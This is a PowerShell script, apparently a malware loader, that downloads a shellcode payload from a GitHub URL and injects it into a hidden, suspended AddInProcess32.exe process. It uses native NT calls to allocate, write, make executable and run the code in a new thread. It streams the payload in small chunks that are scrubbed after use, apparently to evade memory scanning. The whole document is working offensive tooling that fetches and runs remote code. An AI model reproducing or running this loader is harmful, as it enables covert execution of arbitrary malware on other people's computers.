<#
.SYNOPSIS
    ENI loader — stream payload straight into a suspended AddInProcess32 host.
    The full shellcode is never held in PowerShell memory; only small chunks.
#>
[CmdletBinding()]
param(
    [string]$Url = "https://github.com/i25968627-ui/crispy-spoon/raw/refs/heads/main/nfasiv.bin",
    [string]$Target = "C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddInProcess32.exe",
    [switch]$Test
)

$ErrorActionPreference = "Stop"

# -----------------------------------------------------------------------------
# Native API layer
Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Text;

public class EniNative {
    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern bool CreateProcessW(IntPtr lpApplicationName, [MarshalAs(UnmanagedType.LPWStr)] StringBuilder lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, IntPtr lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll")] public static extern uint GetLastError();
    [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("ntdll.dll")] public static extern uint NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);
    [DllImport("ntdll.dll")] public static extern uint NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint NumberOfBytesToWrite, out uint NumberOfBytesWritten);
    [DllImport("ntdll.dll")] public static extern uint NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);
    [DllImport("ntdll.dll")] public static extern uint NtCreateThreadEx(out IntPtr ThreadHandle, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr StartAddress, IntPtr Parameter, bool CreateSuspended, int StackZeroBits, int SizeOfStack, int MaximumStackSize, IntPtr AttributeList);

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {
        public uint cb; public string lpReserved; public string lpDesktop; public string lpTitle;
        public uint dwX; public uint dwY; public uint dwXSize; public uint dwYSize;
        public uint dwXCountChars; public uint dwYCountChars; public uint dwFillAttribute;
        public uint dwFlags; public short wShowWindow; public short cbReserved2;
        public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId;
    }

    public const uint MEM_COMMIT = 0x1000;
    public const uint MEM_RESERVE = 0x2000;
    public const uint PAGE_READWRITE = 0x04;
    public const uint PAGE_EXECUTE_READ = 0x20;
    public const uint CREATE_SUSPENDED = 0x00000004;
    public const uint CREATE_NO_WINDOW = 0x08000000;
    public const uint THREAD_ALL_ACCESS = 0x1FFFFF;
}
"@

# -----------------------------------------------------------------------------
function Invoke-EniLoader {
    param([string]$Uri)

    if (-not (Test-Path -LiteralPath $Target)) { throw "Host not found: $Target" }

    # Create suspended, hidden host
    Write-Host "[*] Creating suspended host: $Target" -ForegroundColor Cyan
    $si = New-Object EniNative+STARTUPINFO
    $si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
    $si.dwFlags = 1      # STARTF_USESHOWWINDOW
    $si.wShowWindow = 0  # SW_HIDE
    $pi = New-Object EniNative+PROCESS_INFORMATION

    $cmd = [System.Text.StringBuilder]::new("`"$Target`"")
    $ok = [EniNative]::CreateProcessW([IntPtr]::Zero, $cmd, [IntPtr]::Zero, [IntPtr]::Zero, $false,
        [EniNative]::CREATE_SUSPENDED -bor [EniNative]::CREATE_NO_WINDOW,
        [IntPtr]::Zero, [IntPtr]::Zero, [ref]$si, [ref]$pi)
    if (-not $ok) {
        $err = [EniNative]::GetLastError()
        throw "CreateProcessW failed. Error: 0x$($err.ToString("X8"))"
    }
    Write-Host "[+] Host spawned. PID=$($pi.dwProcessId) | hProcess=0x$($pi.hProcess.ToString("X")) | hThread=0x$($pi.hThread.ToString("X"))" -ForegroundColor Green

    try {
        # Open remote stream so we never store the full payload locally
        Write-Host "[*] Opening payload stream..." -ForegroundColor Cyan
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $req = [System.Net.WebRequest]::Create($Uri)
        $req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        $resp = $req.GetResponse()
        $stream = $resp.GetResponseStream()
        $total = $resp.ContentLength
        if ($total -le 0) { throw "Could not determine payload size." }
        Write-Host "[+] Payload size: $total bytes (~$([math]::Round($total/1MB,2)) MB)" -ForegroundColor Green

        # Allocate remote memory for the full payload
        Write-Host "[*] Allocating RW memory in host..." -ForegroundColor Cyan
        $base = [IntPtr]::Zero
        $size = [IntPtr]$total
        $status = [EniNative]::NtAllocateVirtualMemory($pi.hProcess, [ref]$base, [IntPtr]::Zero, [ref]$size,
            [EniNative]::MEM_COMMIT -bor [EniNative]::MEM_RESERVE, [EniNative]::PAGE_READWRITE)
        if ($status -ne 0) { throw "NtAllocateVirtualMemory failed. NTSTATUS: 0x$($status.ToString("X8"))" }
        Write-Host "[+] RW buffer: 0x$($base.ToString("X")) [$size bytes]" -ForegroundColor Green

        # Stream payload in chunks, write to remote, scrub chunk immediately
        Write-Host "[*] Streaming payload into host memory..." -ForegroundColor Cyan
        $chunkSize = 65536
        $buf = New-Object byte[] $chunkSize
        $offset = 0
        $writtenTotal = 0
        while (($read = $stream.Read($buf, 0, $chunkSize)) -gt 0) {
            $writeAddr = [IntPtr]::Add($base, $offset)
            $written = 0
            $status = [EniNative]::NtWriteVirtualMemory($pi.hProcess, $writeAddr, $buf, [uint32]$read, [ref]$written)
            if ($status -ne 0) { throw "NtWriteVirtualMemory failed. NTSTATUS: 0x$($status.ToString("X8"))" }
            $offset += $written
            $writtenTotal += $written
            [Array]::Clear($buf, 0, $read)
        }
        $stream.Close()
        $resp.Close()
        $buf = $null
        [System.GC]::Collect()
        Write-Host "[+] Streamed: $writtenTotal bytes" -ForegroundColor Green

        # Flip to RX
        Write-Host "[*] Protecting buffer RX..." -ForegroundColor Cyan
        $oldProtect = 0
        $status = [EniNative]::NtProtectVirtualMemory($pi.hProcess, [ref]$base, [ref]$size, [EniNative]::PAGE_EXECUTE_READ, [ref]$oldProtect)
        if ($status -ne 0) { throw "NtProtectVirtualMemory failed. NTSTATUS: 0x$($status.ToString("X8"))" }
        Write-Host "[+] Buffer now RX" -ForegroundColor Green

        if ($Test) {
            Write-Host "[!] TEST MODE: injection halted before NtCreateThreadEx. Host remains suspended." -ForegroundColor Magenta
            return
        }

        # Create thread in host
        Write-Host "[*] Creating shellcode thread via NtCreateThreadEx..." -ForegroundColor Cyan
        $hThread = [IntPtr]::Zero
        $status = [EniNative]::NtCreateThreadEx([ref]$hThread, [EniNative]::THREAD_ALL_ACCESS, [IntPtr]::Zero,
            $pi.hProcess, $base, [IntPtr]::Zero, $false, 0, 0, 0, [IntPtr]::Zero)
        if ($status -ne 0) { throw "NtCreateThreadEx failed. NTSTATUS: 0x$($status.ToString("X8"))" }
        Write-Host "[+] Thread born. hThread=0x$($hThread.ToString("X"))" -ForegroundColor Green

        # Detach — shellcode owns the host now
        Write-Host "[*] Shellcode executing. Main thread remains suspended." -ForegroundColor Cyan
        [void][EniNative]::CloseHandle($hThread)
    }
    finally {
        [void][EniNative]::CloseHandle($pi.hThread)
        [void][EniNative]::CloseHandle($pi.hProcess)
    }
}

# -----------------------------------------------------------------------------
# Main
Invoke-EniLoader -Uri $Url

Write-Host "[*] Loader finished." -ForegroundColor Cyan
